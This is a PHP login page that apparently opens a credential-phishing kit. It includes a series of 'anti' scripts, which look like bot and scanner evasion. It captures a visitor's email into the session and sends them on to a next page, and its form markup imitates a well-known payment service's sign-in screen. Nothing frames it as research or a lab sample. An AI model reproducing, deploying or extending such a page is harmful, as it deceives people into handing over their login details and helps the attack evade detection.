<?php
session_start();
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
error_reporting(0);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email from the form
    $email = $_POST["EML"];

    // Validate the email (you may want to add more robust validation)
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // Email is valid, store it in a session variable
        $_SESSION["user_email"] = $email;

        // Redirect to the next page
        header("Location: next_page.php");
        exit();
    } else {
        // Email is not valid, handle the error
        echo "Invalid email address";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <!-- Add your CSS styles or include external stylesheets here -->
</head>
<body>
    <form id="PageMainForm" method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        <!-- Your existing form HTML -->
        <div class="textInput" id="login_emaildiv" style="z-index: 1;">
            <div class="fieldWrapper">
                <input id="email" name="EML" type="email" class="hasHelp validateEmpty" required="required" value="" autocomplete="username" placeholder="E-mail address" aria-describedby="emailErrorMessage">
                <label for="email" class="fieldLabel">E-mail address</label>
                <div class="errorMessage" id="emailErrorMessage">
                    <p class="emptyError hide">Obligatoire</p>
                </div>
            </div>
            <a href="#" id="forgotEmail" class="recoveryOption" pa-marked="1">Forgot email?</a>	
        </div>
        <div class="actions">
            <button class="button actionContinue scTrack" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Next</button>
        </div>
    </form>
</body>
</html>
